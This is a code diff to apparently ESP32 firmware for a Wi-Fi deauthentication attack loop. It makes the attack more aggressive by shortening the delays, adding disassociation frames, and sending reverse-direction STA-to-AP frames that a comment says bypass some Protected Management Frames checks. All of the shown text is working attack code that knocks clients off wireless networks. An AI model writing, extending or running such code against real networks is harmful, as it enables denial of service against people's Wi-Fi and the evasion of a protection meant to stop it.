@@ -13,22 +13,29 @@ static void dt_run(void*){
   uint8_t f[64];
   dt_errors=0;
   while(dt_running){
-    if(!safety_rate_ok(1)){vTaskDelay(pdMS_TO_TICKS(100));continue;}
-    size_t n=f_deauth(f,dt_bcast?BC:dt_sta,dt_bssid,dt_reason);
+    if(!safety_rate_ok(1)){vTaskDelay(pdMS_TO_TICKS(50));continue;}
+    const uint8_t* dst = dt_bcast ? BC : dt_sta;
+
+    // 1) AP→STA deauth
+    size_t n = f_deauth(f, dst, dt_bssid, dt_reason);
     esp_err_t err = esp_wifi_80211_tx(WIFI_IF_AP, f, n, false);
-    if(err != ESP_OK){
-      // AP interface rejected it — try STA
-      err = esp_wifi_80211_tx(WIFI_IF_STA, f, n, false);
+    if(err != ESP_OK) err = esp_wifi_80211_tx(WIFI_IF_STA, f, n, false);
+    if(err == ESP_OK) dt_sent++;
+    else { if(++dt_errors==1) Serial.printf("[deauth] TX: %s\n", esp_err_to_name(err)); }
+
+    // 2) AP→STA disassoc
+    n = f_disassoc(f, dst, dt_bssid, dt_reason);
+    esp_wifi_80211_tx(WIFI_IF_AP, f, n, false); dt_sent++;
+
+    // 3) STA→AP deauth (reverse direction — bypasses some PMF checks)
+    if(!dt_bcast){
+      n = f_deauth_r(f, dt_bssid, dt_sta, dt_reason);
+      esp_wifi_80211_tx(WIFI_IF_AP, f, n, false); dt_sent++;
+      n = f_disassoc_r(f, dt_bssid, dt_sta, dt_reason);
+      esp_wifi_80211_tx(WIFI_IF_AP, f, n, false); dt_sent++;
     }
-    if(err != ESP_OK){
-      dt_errors++;
-      if(dt_errors==1){
-        Serial.printf("[deauth] TX failed: %s (0x%x)\n", esp_err_to_name(err), err);
-      }
-    } else {
-      dt_sent++;
-    }
-    vTaskDelay(pdMS_TO_TICKS(20));
+
+    vTaskDelay(pdMS_TO_TICKS(5));
   }
   dt_task=nullptr;vTaskDelete(nullptr);
 }
